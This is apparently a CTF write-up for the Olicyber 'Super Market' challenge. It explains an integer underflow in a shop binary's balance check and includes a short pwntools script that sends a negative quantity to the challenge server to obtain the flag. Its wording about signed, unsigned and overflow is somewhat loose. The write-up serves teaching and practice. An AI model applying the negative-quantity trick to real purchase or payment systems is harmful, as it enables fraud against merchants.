---
title: "Super Market — Integer Underflow Price Manipulation"
date: 2024-01-01
categories: ["Olicyber"]
series: ["COlicyber"]
tags: ["pwn", "integer-underflow", "pwntools"]
difficulty: "beginner"
summary: "Pass a negative quantity to an unsigned arithmetic check, causing integer underflow that bypasses a balance validation and grants access to a premium item."
---

## The Challenge

The binary is a shop simulation. You start with a finite balance and need to buy something that costs more than you have. Quantities are read from user input but not validated for sign.

## Approach

Balance checks in C often look like `if (balance - price * quantity >= 0)`. If `quantity` is signed and negative, `price * quantity` becomes negative, flipping the subtraction direction. The result overflows into a large positive number that always passes the check.

Sending `-1` as the quantity causes the shop to credit your account instead of debit it, or wraps the balance check entirely.

## Solution

```python
from pwn import *

r = remote("market.challs.olicyber.it", 10005)
r.recv()
r.sendline(b"3")
r.recv()
r.recv()
r.sendline(b"-1") # payload negativo non controllato
print(r.recv().decode().strip())
```

Option `3` selects the item. The quantity prompt receives `-1`. The unchecked integer arithmetic in the binary wraps the balance or the price calculation, satisfying the condition and printing the flag.

## What I Learned

Integer underflow in shop/balance simulations is a classic intro bug. Whenever a purchase flow accepts user-supplied quantities without range-checking for negatives, the arithmetic path that subtracts `price * quantity` from balance becomes exploitable with negative input. Always verify both upper and lower bounds on numeric inputs.
